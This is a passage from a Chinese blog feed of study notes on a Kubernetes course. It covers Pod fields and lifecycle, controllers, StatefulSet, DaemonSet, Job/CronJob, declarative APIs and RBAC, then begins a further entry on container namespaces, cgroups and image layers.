容器一致，而与容器 A 和 B 无关</li></ul><p>sidecar ：我们可以在一个 Pod 中，启动一个辅助容器，来完成一些独立于主进程（主容器）之外的工作。可使用 initContainers。</p><blockquote><p>Pod，实际上是在扮演传统基础设施里“虚拟机”的角色；而容器，则是这个虚拟机里运行的用户程序。</p></blockquote></blockquote><h3 id="14-深入解析-Pod-对象（一）：基本概念"><a href="#14-深入解析-Pod-对象（一）：基本概念" class="headerlink" title="14. 深入解析 Pod 对象（一）：基本概念"></a>14. 深入解析 Pod 对象（一）：基本概念</h3><blockquote><p>容器是 Pod 属性里的一个普通的字段，那么到底哪些属性属于 Pod 对象，而又有哪些属性属于 Container 呢？</p><ul><li><p>把 Pod 看成传统环境里的“机器”，把容器看作是运行在这个“机器”里的用户程序。</p></li><li><p><strong>凡是调度、网络、存储、以及安全相关的属性，基本上是 Pod 级别的。</strong>它们描述的是“机器”这个整体，而不是里面运行的“程序”<br>几个重要字段的含义和用法：</p><ul><li>NodeSelector：绑定 Pod 和 Node。</li><li>NodeName：一旦 Pod 的这个字段被赋值，Kubernetes 项目就会被认为这个 Pod 已经经过了调度，调度的结果就是赋值的节点名字。</li><li>HostAliases：定义了 Pod 的 hosts 文件（比如 /etc/hosts）里的内容。</li></ul></li><li><p>除了上述跟“机器”相关的配置外，<strong>凡是跟容器的 Linux Namespace 相关的属性，也一定是 Pod 级别的。</strong></p><ul><li>比如 shareProcessNamespace=true：这个 Pod 里的容器要共享 PID Namespace。</li><li>凡是 Pod 中的容器要共享宿主机的 Namespace，也一定是 Pod 级别的定义，例如 hostNetwork、hostIPC、hostPID。</li></ul></li><li><p>Pod 里最重要的字段当属 “Containers”，除了 Image、Command、workingDir、Ports、volumeMounts 外几个值得注意的属性（当然都属于 Container ）：</p><ul><li>ImagePullPolicy ：定义了镜像拉取的策略。</li><li>Lifecycle ：定义的是 Container Lifecycle Hooks。在容器状态发生变化时（启动时、删除时）触发一系列“钩子”。</li></ul></li></ul><p>Pod 对象在 Kubernetes 中的生命周期，主要体现在 Pod API 对象的 Status 部分（pod.status.phase）：</p><ol><li>Pending：Pod 的 YAML 文件已经提交给了 Kubernetes，API 对象已经被创建并保存在 Etcd 当中。但是，这个 Pod 里有些容器因为某种原因而不能被顺利创建。比如，调度不成功。</li><li>Running：Pod 已经调度成功，跟一个具体的节点绑定。它包含的容器都已经创建成功，并且至少有一个正在运行中。</li><li>Succeeded：Pod 里的所有容器都正常运行完毕，并且已经退出了。这种情况在运行一次性任务时最为常见。</li><li>Failed：Pod 里至少有一个容器以不正常的状态（非 0 的返回码）退出。这个状态的出现，意味着你得想办法 Debug 这个容器的应用，比如查看 Pod 的 Events 和日志。</li><li>Unknown：这是一个异常状态，意味着 Pod 的状态不能持续地被 kubelet 汇报给 kube-apiserver，这很有可能是主从节点（Master 和 Kubelet）间的通信出现了问题。</li></ol><p>更进一步地，Pod 对象的 Status 字段，还可以再细分出一组 Conditions。它们主要用于描述造成当前 Status 的具体原因是什么。</p></blockquote><h3 id="15-深入解析-Pod-对象（二）：使用进阶"><a href="#15-深入解析-Pod-对象（二）：使用进阶" class="headerlink" title="15. 深入解析 Pod 对象（二）：使用进阶"></a>15. 深入解析 Pod 对象（二）：使用进阶</h3><blockquote><p>Projected Volume：投射数据卷，为容器提供预先定义好的数据。</p><ul><li>Secret</li><li>ConfigMap</li><li>Downward API：让 Pod 里的容器能够直接获取到这个 Pod API 对象本身的信息。</li><li>ServiceAccountToken</li></ul><p>Kubernetes 中并没有 Docker 的 Stop 语义。所以虽然是 Restart（重启），但实际却是重新创建了容器。<br>这个功能就是 Kubernetes 里的Pod 恢复机制，也叫 restartPolicy。它是 Pod 的 Spec 部分的一个标准字段（pod.spec.restartPolicy），默认值是 Always</p><ul><li>Always：在任何情况下，只要容器不在运行状态，就自动重启容器</li><li>OnFailure：只在容器异常时才自动重启容器</li><li>Never：从来不重启容器</li></ul><p>两个基本的设计原理：</p><ul><li>只要 Pod 的 restartPolicy 指定的策略允许重启异常的容器（比如：Always），那么这个 Pod 就会保持 Running 状态，并进行容器重启。否则，Pod 就会进入 Failed 状态 。</li><li>对于包含多个容器的 Pod，只有它里面所有的容器都进入异常状态后，Pod 才会进入 Failed 状态。在此之前，Pod 都是 Running 状态。此时，Pod 的 READY 字段会显示正常容器的个数。</li></ul><p>PodPreset（Pod 预设置）</p><ul><li>PodPreset 里定义的内容，只会在 Pod API 对象被创建之前追加在这个对象本身上，而不会影响任何 Pod 的控制器的定义。</li></ul></blockquote><h3 id="16-编排其实很简单：谈谈“控制器”模型"><a href="#16-编排其实很简单：谈谈“控制器”模型" class="headerlink" title="16. 编排其实很简单：谈谈“控制器”模型"></a>16. 编排其实很简单：谈谈“控制器”模型</h3><blockquote><p>Pod 这个看似复杂的 API 对象，实际上就是对容器的进一步抽象和封装而已。</p><p> kube-controller-manager 组件是一系列控制器的集合，这些控制器都遵循 Kubernetes 项目中的一个通用编排模式，即：控制循环（control loop）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for &#123;</span><br><span class="line"> 实际状态 :&#x3D; 获取集群中对象 X 的实际状态（Actual State）</span><br><span class="line"> 期望状态 :&#x3D; 获取集群中对象 X 的期望状态（Desired State）</span><br><span class="line"> if 实际状态 &#x3D;&#x3D; 期望状态&#123;</span><br><span class="line">   什么都不做</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">   执行编排动作，将实际状态调整为期望状态</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际状态往往来自 Kubernetes 集群本身，期望状态一般来自于用户提交的 YAML 文件。</p></blockquote><h3 id="17-经典-PaaS-的记忆：作业副本与水平扩展"><a href="#17-经典-PaaS-的记忆：作业副本与水平扩展" class="headerlink" title="17. 经典 PaaS 的记忆：作业副本与水平扩展"></a>17. 经典 PaaS 的记忆：作业副本与水平扩展</h3><blockquote><p>Deployment 的重要功能：Pod 的“水平扩展 / 收缩”（horizontal scaling out/in）。<br>Deployment 滚动更新能力依赖的是 ReplicaSet 对象。<br>一个 ReplicaSet 对象，其实就是由副本数目的定义和一个 Pod 模板组成的。Deployment 控制器实际操控的，正是这样的 ReplicaSet 对象，而不是 Pod 对象。</p><p>一个定义了 replicas=3 的 Deployment，与它的 ReplicaSet，以及 Pod 的关系，实际上是一种“层层控制”的关系。<br><img src="http://xhisall.gitee.io/image/image/ab4902a0437af4347bec520468c5e7cd.png"></p><p>水平扩展/伸缩：是需要修改它所控制的 ReplicaSet 的 Pod 的副本个数</p><p><img src="http://xhisall.gitee.io/image/image/79dcd2743645e39c96fafa6deae9d6f6.png"><br> 如上图所示，Deployment 的控制器，实际上控制的是 ReplicaSet 的数目，以及每个 ReplicaSet 的属性。<br> 而一个应用的版本，对应的正是一个 ReplicaSet，这个版本应用的 Pod 数量，则由 ReplicaSet 通过它自己的控制器（ReplicaSet Controller）来保证。</p><p>  spec.revisionHistoryLimit：Kubernetes 为 Deployment 保留的“历史版本”个数</p></blockquote><h3 id="18-深入理解-StatefulSet（一）：拓扑状态"><a href="#18-深入理解-StatefulSet（一）：拓扑状态" class="headerlink" title="18. 深入理解 StatefulSet（一）：拓扑状态"></a>18. 深入理解 StatefulSet（一）：拓扑状态</h3><blockquote><p>Deployment 实际上并不足以覆盖所有的应用编排问题，根本原因在于 Deployment 对应用做了一个简单化假设。它认为，一个应用的所有 Pod，是完全一样的。所以它们互相之间没有顺序，也无所谓运行在哪台宿主机上，根据需求随时创建或 kill 掉。但是在实际的场景中，并不是所有的应用都可以满足这样的要求。</p><p>实例之间有不对等关系，以及实例对外部数据有依赖关系的应用，被称为”有状态应用“（Stateful Application）</p><p>容器用来封装”无状态应用“（Stateless Application），尤其是 Web 服务，非常好用，但是一旦要使用容器运行 ”有状态应用“，困难程度会直线上升。</p><p> Kubernetes 在 Deployment 的基础上，扩展出了对”有状态应用“的初步支持：StatefulSet。<br> 它把真实世界里的应用状态，抽象成了两种情况：</p><ol><li>拓扑状态。这种情况意味着，应用的多个实例之间不是完全对等的关系。比如特定的启动顺序，唯一的网络标识符。</li><li>存储状态。这种情况意味着，应用的多个实例分别绑定了不同的存储数据。比如持久稳定的存储。<br>StatefulSet 的核心功能，就是通过某种方式记录这些状态，然后在 Pod 被重新创建时，能够为新 Pod 恢复这些状态。  </li></ol><p>一个 Kubernetes 项目中非常实用的概念：Headless Service。<br>Service 被访问的方式：</p><ol><li>VIP（Virtual IP）方式。</li><li>DNS 方式：<ul><li>Normal Service：访问 ”my-svc.my-namespace.svc.cluster.local” 解析到的是 Service 的 VIP，后面的流程跟 VIP 方式一致。</li><li>Headless Service：访问 “my-svc.my-namespace.svc.cluster.local” 解析到的<strong>直接</strong>就是 my-svc 代理的某一个 Pod 的 IP 地址。</li></ul></li></ol><p>Headless Service 的 clusterIP 值为 <strong>None</strong>，即：这个 Service，没有一个 VIP 作为“头”。这也就是 Headless 的含义。所以，这个 Service 被创建后并不会被分配一个 VIP，而是会以 DNS 记录的方式暴露出它所代理的 Pod。<br>当创建 Headless Service 后，它所代理的所有 Pod 的 IP 地址，都会被绑定一个 DNS 记录：<br><code>&lt;pod-name&gt;.&lt;svc-name&gt;.&lt;namespace&gt;.svc.cluster.local</code><br>这个 DNS 记录，正是 Kubernetes 项目为 Pod 分配的唯一的“可解析身份”（Resolvable Identity）。有了这个“可解析身份”，只要你知道了一个 Pod 的名字，以及它对应的 Service 的名字，你就可以非常确定地通过这条 DNS 记录访问到 Pod 的 IP 地址。</p><p>StatefulSet 在使用  Headless Service 时，会给它所管理的所有 Pod 的名字进行编号，而且这些编号都是从 0 开始累加，与 StatefulSet 的每个 Pod 实例一一对应，绝不重复。更重要的是，这些 Pod 的创建，也是严格按照编号顺序进行的，比如当 web-0 进入到 Ready 之前，web-1 会一直处于 Pending 状态。当删除原来的 Pod 后，Kubernetes 会按照原先编号的顺序创建两个新 Pod，并给它们分配与原来相同的 hostname。</p><p>通过这种方法，Kubernetes 就成功地将 Pod 的拓扑状态（比如：哪个节点先启动，哪个节点后启动），按照 Pod 的“名字 + 编号”的方式固定了下来。此外，Kubernetes 还为每一个 Pod 提供了一个固定并且唯一的访问入口，即：这个 Pod 对应的 DNS 记录。</p><p> 总结：</p><blockquote><p>StatefulSet 这个控制器的主要作用之一，就是使用 Pod 模板创建 Pod 的时候，对它们进行编号，并且按照编号顺序逐一完成创建工作。而当 StatefulSet 的“控制循环”发现 Pod 的“实际状态”与“期望状态”不一致，需要新建或者删除 Pod 进行“调谐”的时候，它会严格按照这些 Pod 编号的顺序，逐一完成这些操作。</p></blockquote></blockquote><h3 id="19-深入理解-StatefulSet（二）：存储状态"><a href="#19-深入理解-StatefulSet（二）：存储状态" class="headerlink" title="19. 深入理解 StatefulSet（二）：存储状态"></a>19. 深入理解 StatefulSet（二）：存储状态</h3><blockquote><p> StatefulSet 对存储状态的管理机制主要使用的是一个叫作 Persistent Volume Claim 的功能。</p><p> StatefulSet 的工作原理：</p><ul><li>StatefulSet 的控制器直接管理的是 Pod。这是因为 StatefulSet 里的不同 Pod 实例，不再像 ReplicaSet 中那样都是完全一样的，而是有细微区别的。比如，每个 Pod 的 hostname、名字等都是不同的、携带了编号的。而 StatefulSet 区分这些实例的方式，就是通过在 Pod 的名字里加上事先约定好的编号。</li><li>Kubernetes 通过 Headless Service，为这些有编号的 Pod，在 DNS 服务器中生成带有同样编号的 DNS 记录。只要 StatefulSet 能够保证这些 Pod 名字里的编号不变，那么 Service 里类似于 web-0.nginx.default.svc.cluster.local 这样的 DNS 记录也就不会变，而这条记录解析出来的 Pod 的 IP 地址，则会随着后端 Pod 的删除和再创建而自动更新。这当然是 Service 机制本身的能力，不需要 StatefulSet 操心。</li><li>StatefulSet 还为每一个 Pod 分配并创建一个同样编号的 PVC。这样，Kubernetes 就可以通过 Persistent Volume 机制为这个 PVC 绑定上对应的 PV，从而保证了每一个 Pod 都拥有一个独立的 Volume。即使 Pod 被删除，它所对应的 PVC 和 PV 依然会保留下来，所以当 Pod 被重新创建之后，Kubernetes 会为它找到同样编号的 PVC，挂载这个 PVC 对应的 Volume。</li></ul><p>StatefulSet 其实就是一种特殊的 Deployment，而其独特之处在于，它的每个 Pod 都被编号了。而且，这个编号会体现在 Pod 的名字和 hostname 等标识信息上，这不仅代表了 Pod 的创建顺序，也是 Pod 的重要网络标识（即：在整个集群里唯一的、可被的访问身份）。<br>有了这个编号后，StatefulSet 就使用 Kubernetes 里的两个标准功能：Headless Service 和 PV/PVC，实现了对 Pod 的拓扑状态和存储状态的维护。</p></blockquote><h3 id="21-容器化守护进程的意义：DaemonSet"><a href="#21-容器化守护进程的意义：DaemonSet" class="headerlink" title="21. 容器化守护进程的意义：DaemonSet"></a>21. 容器化守护进程的意义：DaemonSet</h3><blockquote><p>DaemonSet 的主要作用，是让你在 Kubernetes 集群里，运行一个 Daemon Pod。 所以，这个 Pod 有如下三个特征：</p><ol><li>这个 Pod 运行在 Kubernetes 集群里的每一个节点（Node）上；</li><li>每个节点上只有一个这样的 Pod 实例；</li><li>当有新的节点加入 Kubernetes 集群后，该 Pod 会自动地在新节点上被创建出来；而当旧节点被删除后，它上面的 Pod 也相应地会被回收掉。</li></ol><p><strong>更重要的是</strong>，跟其他编排对象不一样，DaemonSet 开始运行的时机，很多时候比整个 Kubernetes 集群出现的时机都要早。（网络插件 Agent）</p></blockquote><blockquote><p>DaemonSet 其实是一个非常简单的控制器。在它的控制循环中，只需要遍历所有节点，然后根据节点上是否有被管理 Pod 的情况，来决定是否要创建或者删除一个 Pod。</p><p>只不过，在创建每个 Pod 的时候，DaemonSet 会自动给这个 Pod 加上一个 nodeAffinity，从而保证这个 Pod 只会在指定节点上启动。同时，它还会自动给这个 Pod 加上一个 Toleration，从而忽略节点的 unschedulable“污点”。</p><p>DaemonSet 使用 ControllerRevision，来保存和管理自己对应的“版本”。这个 ControllerRevision 对象，实际上是在 Data 字段保存了该版本对应的完整的 DaemonSet 的 API 对象。并且，在 Annotation 字段保存了创建这个对象所使用的 kubectl 命令。（ControllerRevision 其实是一个通用的版本管理对象）</p></blockquote><h3 id="22-撬动离线业务：Job-与-CronJob"><a href="#22-撬动离线业务：Job-与-CronJob" class="headerlink" title="22. 撬动离线业务：Job 与 CronJob"></a>22. 撬动离线业务：Job 与 CronJob</h3><blockquote><p>Job 对象在创建后，它的 Pod 模板，被自动加上了一个  controller-uid=&lt; 一个随机字符串 &gt; 这样的 Label。而这个 Job 对象本身，则被自动加上了这个 Label 对应的 Selector，从而保证了 Job 与它所管理的 Pod 之间的匹配关系。</p><p>restartPolicy 在 Job 对象里只允许被设置为 Never 和 OnFailure</p><ul><li>Never：离线作业失败后 Job Controller 就会不断地尝试创建一个新 Pod</li><li>OnFailure：不会创建新的 Pod，但是会不断地重启 Pod 中的容器</li></ul><p>spec.backoffLimit：设置重启次数<br>spec.activeDeadlineSeconds：设置最长运行时间</p><p>Job Controller 对并行作业的控制方法：</p><ul><li>spec.parallelism：最大并行数，spec.completions：最小完成数</li><li>首先，Job Controller 控制的对象，直接就是 Pod。</li><li>其次，Job Controller 在控制循环中进行的调谐（Reconcile）操作，是根据实际在 Running 状态 Pod 的数目、已经成功退出的 Pod 的数目，以及 parallelism、completions 参数的值共同计算出在这个周期里，应该创建或者删除的 Pod 数目，然后调用 Kubernetes API 来执行这个操作。</li></ul><p>CronJob：一个 Job 对象的控制器</p><ul><li>spec.schedule：Unix Cron 表达式</li><li>concurrencyPolicy：<ul><li>Allow：Job 可以同时存在</li><li>Forbid：不会创建新的 Pod，该创建周期被跳过</li><li>Replace：新产生的 Job 会替换旧的、没有执行完的 Job</li></ul></li></ul><p>spec.startingDeadlineSeconds：如果某一次 Job 创建失败，这次创建就会被标记成“miss”。当在指定的时间窗口内，miss 的数目达到 100 时，CronJob 会停止再创建这个 Job。</p></blockquote><h3 id="23-声明式API与Kubernetes编程范式"><a href="#23-声明式API与Kubernetes编程范式" class="headerlink" title="23. 声明式API与Kubernetes编程范式"></a>23. 声明式API与Kubernetes编程范式</h3><blockquote><p>kubectl replace：使用新的 YAML 文件中的 API 对象，替换原有的 API 对象。一次只能处理一个写请求。<br>kubectl apply（<strong>声明式 API</strong>）：执行了一个对原有 API 对象的 PATCH 操作，一次能处理多个写操作，并且具备 Merge 能力。</p><p>Kubernetes 能够对 API 对象进行在线更新的能力，这也是 Kubernetes “声明式 API”的独特之处：</p><ul><li>首先，所谓“声明式”，指的就是我只需要提交一个定义好的 API 对象来“声明”，我所期望的状态是什么样子。</li><li>其次，“声明式 API”允许有多个 API 写端，以 PATCH 的方式对 API 对象进行修改，而无需关心本地原始 YAML 文件的内容。</li><li>最后，也是最重要的，有了上述两个能力，Kubernetes 项目才可以基于对 API 对象的增、删、改、查，在完全无需外界干预的情况下，完成对“实际状态”和“期望状态”的调谐（Reconcile）过程。<br>所以说，声明式 API，才是 Kubernetes 项目编排能力“赖以生存”的核心所在。</li></ul><p>[24]. 深入解析声明式 API（一）：API 对象的奥秘<br>[25]. 深入解析声明式 API（二）：编写自定义控制器</p></blockquote><h3 id="26-基于角色的权限控制：RBAC"><a href="#26-基于角色的权限控制：RBAC" class="headerlink" title="26. 基于角色的权限控制：RBAC"></a>26. 基于角色的权限控制：RBAC</h3><blockquote><p>在 Kubernetes 中，负责完成授权（Authorization）工作的机制，就是 RBAC：基于角色的访问控制（Role-Based Access Control）</p><ul><li>Role：角色，它其实是一组规则，定义了一组对 Kubernetes API 对象的操作权限。</li><li>Subject：被作用者，既可以是“人”，也可以是“机器”，也可以是你在 Kubernetes 里定义的“用户”。</li><li>RoleBinding：定义了“被作用者”和“角色”的绑定关系。</li></ul><p>Role</p><ul><li>namespace：首先指定了它能产生作用的 namespace。</li><li>rules：它所定义的权限规则。下面规则的含义：允许”被作用者“，对 mynamespace 下面的 Pod 对象，进行 GET、WATCH 和 LIST 操作。</li></ul></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">mynamespace</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example-role</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure><blockquote><p>RoleBinding：指定被作用者</p><ul><li>subjects：被作用者，它的类型是 User，即 Kubernetes 里的用户。</li><li>roleRef：通过这个字段，RoleBinding 对象就可以直接通过名字，来引用我们前面定义的 Role 对象（example-role），从而定义了“被作用者（Subject）”和“角色（Role）”之间的绑定关系。</li></ul></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example-rolebinding</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">mynamespace</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example-user</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">example-role</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><blockquote><p>Role 和 RoleBinding 对象都是 Namespaced 对象，它们对权限的限制规则仅在它们自己的 Namespace 有效。roleRef 也只能引用当前 Namespace 里的 Role 对象。<br>对于非 Namespaced（Non-namespaced）对象（比如：Node），或者某一个 Role 想要作用于所有的 Namespace 的时候，需要使用 ClusterRole 和 ClusterRoleBinding 的组合。</p><p>赋予所有权限：<code>verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;, &quot;delete&quot;]</code></p><p>在大多数时候，我们其实都不太使用”用户“这个功能，而是直接使用 Kubernetes 里的“内置用户”：<strong>ServiceAccount</strong></p><ul><li><p>定义一个 ServiceAccount。</p></li><li><p>通过编写 RoleBinding 的 YAML 文件，来为这个 ServiceAccount 分配权限。</p></li><li><p>创建 Role、ServiceAccount、RoleBinding 对象。</p><p>在生产环境中，我强烈建议你为所有 Namespace 下的默认 ServiceAccount，绑定一个只读权限的 Role。</p><p>除了前面使用的“用户”（User），Kubernetes 还拥有“用户组”（Group）的概念，也就是一组“用户”的意思。如果你为 Kubernetes 配置了外部认证服务的话，这个“用户组”的概念就会由外部认证服务提供。</p></li></ul><p>实际上，一个 ServiceAccount，在 Kubernetes 里对应的“用户”的名字是：<code>system:serviceaccount:&lt;ServiceAccount 名字 &gt;</code><br>而它对应的内置“用户组”的名字，就是：<code>system:serviceaccounts:&lt;Namespace 名字 &gt;</code></p><p>除此之外，Kubernetes 还提供了四个预先定义好的 ClusterRole 来供用户直接使用：</p><ul><li>cluster-admin</li><li>admin</li><li>edit</li><li>view</li></ul><p>cluster-admin 是整个项目中的最高权限，务必要谨慎而小心地使用它。</p><p>总结<br>所谓角色（Role），其实就是一组权限规则列表。而我们分配这些权限的方式，就是通过创建 RoleBinding 对象，将被作用者（subject）和权限列表进行绑定。</p><p>另外，与之对应的 ClusterRole 和 ClusterRoleBinding，则是 Kubernetes 集群级别的 Role 和 RoleBinding，它们的作用范围不受 Namespace 限制。</p><p>而尽管权限的被作用者可以有很多种（比如，User、Group 等），但在我们平常的使用中，最普遍的用法还是 ServiceAccount。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://time.geekbang.org/column/intro/116&quot;&gt;深入剖析Kubernetes（极客时间）&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;10-Kubernetes-一键部署利器：kubeadm&quot;&gt;&lt;a href=&quot;#10-Kube</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>深入剖析 Kubernetes 笔记（一）</title>
    <link href="http://woodpile27.cn/2020/12/25/kubernetes-note-1/"/>
    <id>http://woodpile27.cn/2020/12/25/kubernetes-note-1/</id>
    <published>2020-12-25T00:00:00.000Z</published>
    <updated>2020-12-25T04:27:56.522Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://time.geekbang.org/column/intro/116">深入剖析Kubernetes（极客时间）</a></p><h3 id="05-白话容器基础（一）：从进程说开去"><a href="#05-白话容器基础（一）：从进程说开去" class="headerlink" title="05. 白话容器基础（一）：从进程说开去"></a>05. 白话容器基础（一）：从进程说开去</h3><blockquote><p>容器本身没有价值，有价值的是“容器编排”。</p><p>容器技术的核心功能，就是通过约束和修改进程的动态表现，从而为其创造出一个“边界”。</p><p>跟真实存在的虚拟机不同，在使用 Docker 的时候，并没有一个真正的“Docker 容器”运行在宿主机里面。Docker 项目帮助用户启动的，还是原来的应用进程，只不过在创建这些进程时，Docker 为它们加上了各种各样的 Namespace 参数。这时，这些进程就会觉得自己是各自 PID Namespace 里的第 1 号进程，只能看到各自 Mount Namespace 里挂载的目录和文件，只能访问到各自 Network Namespace 里的网络设备，就仿佛运行在一个个“容器”里面，与世隔绝。</p></blockquote><h3 id="06-白话容器基础（二）：隔离与限制"><a href="#06-白话容器基础（二）：隔离与限制" class="headerlink" title="06. 白话容器基础（二）：隔离与限制"></a>06. 白话容器基础（二）：隔离与限制</h3><blockquote><p>“敏捷”和“高性能”是容器相较于虚拟机最大的优势，也是它能够在 PaaS 这种更细粒度的资源管理平台上大行其道的重要原因。</p><p>容器相比于虚拟机也有很多不足之处，其中的最主要问题是：隔离得不彻底</p><ul><li>首先，既然容器只是运行在宿主机上的一种特殊的进程，那么多个容器之间使用的就还是同一个宿主机的操作系统内核。</li><li>其次，在 Linux 内核中，有很多资源和对象是不能被 Namespace 化的，最典型的例子就是：时间。</li></ul><p>Linux Cgroups 的设计还是比较易用的，简单粗暴地理解呢，它就是一个子系统目录加上一组资源限制文件的组合。而对于 Docker 等 Linux 容器项目来说，它们只需要在每个子系统下面，为每个容器创建一个控制组（即创建一个新目录），然后在启动容器进程之后，把这个进程的 PID 填写到对应控制组的 tasks 文件中就可以了。</p><p>一个正在运行的 Docker 容器，其实就是一个启用了多个 Linux Namespace 的应用进程，而这个进程能够使用的资源量，则受 Cgroups 配置的限制。这也是容器技术中一个非常重要的概念，即：容器是一个“<strong>单进程</strong>”模型。</p><p>在一个容器中，你没办法同时运行两个不同的应用，除非找到一个公共的 PID=1 的程序来充当两个不同应用的父进程（systemd、supervisord）。但还有更好的解决方法，因为容器本身的设计就是希望<strong>容器和应用能够同生命周期</strong>，不希望出现“容器是正常运行的，但是里面的应用早已经挂了”的情况。</p></blockquote><h3 id="07-白话容器基础（三）：深入理解容器镜像"><a href="#07-白话容器基础（三）：深入理解容器镜像" class="headerlink" title="07. 白话容器基础（三）：深入理解容器镜像"></a>07. 白话容器基础（三）：深入理解容器镜像</h3><blockquote><p>Mount Namespace 是第一个进入 Linux 内核的 namespace，它们隔离了每个进程可以看到的挂载点列表。</p><p>Mount Namespace 修改的，是容器进程对文件系统“挂载点”的认知。只有在“挂载”这个操作发生之后，进程的视图才会被改变。而在此之前，新创建的容器会直接继承宿主机的各个挂载点。所以在创建新进程时，除了声明启用 Mount Namespace 之外，可以告诉进程那些目录需要重新挂载。</p><p>我们可以在容器进程启动之前重新挂载它的整个根目录“/”。而由于 Mount Namespace 的存在，这个挂载对宿主机不可见，所以容器进程就可以在里面随便折腾了。chroot 命令可以改变进程的根目录到你指定的位置。</p><p>为了让容器的根目录更”真实“，一般会在容器的根目录下挂载一个完整操作系统的文件系统，而这个挂载在容器根目录上、用来为容器进程提供隔离后执行环境的文件系统，就是所谓的“<strong>容器镜像</strong>”。它还有一个更为专业的名字，叫作：<strong>rootfs</strong>（根文件系统）。</p><p>对 Docker 项目来说，它最核心的原理实际上就是为待创建的用户进程：</p><ol><li>启用 Linux Namespace 配置</li><li>设置指定的 Cgroups 参数</li><li>切换进程的根目录 （Change Root）（优先使用 pivot_root 系统调用）</li></ol><p>rootfs 只包括了操作系统的“躯壳”（文件、配置和目录），并没有包括操作系统的“灵魂”（内核）。同一台机器上的所有容器，都共享宿主机操作系统的内核。</p><p>正是由于 rootfs 的存在，容器才有了一个被反复宣传至今的重要特性：<strong>一致性</strong>。容器镜像“打包操作系统”的能力赋予了容器的一致性。</p><p>Docker 在镜像的设计中，引入了层（layer）的概念。也就是说，用户制作镜像的每一步操作，都会生成一个层，也就是一个增量 rootfs。</p><p>Docker 镜像使用了联合文件系统（Union File System），最主要的功能是将多个不同位置的目录联合挂载（union mount）到同一个目录下。下文中以 AuFS 为例。</p><p>容器的 rootfs 由三部分组成：<br>[ 可读写层 ]（容器层）<br>[ Init层 ]<br>[ 只读层 ]（镜像层）</p><ol><li>只读层：位于最下面，挂载方式都是只读的（readonly + whiteout）</li><li>可读写层：位于最上边，挂载方式为 readwrite。<br>在没有写入文件之前，这个目录是空的。而一旦在容器里做了写操作，你修改产生的内容就会以增量的方式出现在这个层中。而如果要删除一个只读层里的文件，AuFS（我的主机上使用的其实是 overlay2） 会在可读写层创建一个 whiteout 文件，把只读层里的文件“遮挡”起来。可读写层的作用，就是专门用来存放你修改 rootfs 后产生的增量，无论是增、删、改，都发生在这里，而只读层不会有任何改变。</li><li>Init 层：是一个以“-init”结尾的层，夹在只读层和读写层之间。Init 层是 Docker 项目单独生成的一个内部层，专门用来存放 /etc/hosts、/etc/resolv.conf 等信息。这些文件本来属于只读的 Ubuntu 镜像的一部分，但是用户往往需要在启动容器时写入一些指定的值比如 hostname，所以就需要在可读写层对它们进行修改。而用户执行 docker commit 只会提交可读写层，并不会包含这些内容。<br>相同的文件上层会覆盖掉下层。在修改镜像层文件时，首先会从上到下查找有没有这个文件，找到，就复制到容器层中，修改，修改的结果就会作用到下层的文件，这种方式也被称为copy-on-write。</li></ol></blockquote><h3 id="08-白话容器基础（四）：重新认识Docker容器"><a href="#08-白话容器基础（四）：重新认识Docker容器" class="headerlink" title="08. 白话容器基础（四）：重新认识Docker容器"></a>08. 白话容器基础（四）：重新认识Docker容器</h3><blockquote><p>docker exec 的实现原理：一个进程，可以选择<strong>加入</strong>到某个进程已有的 Namespace 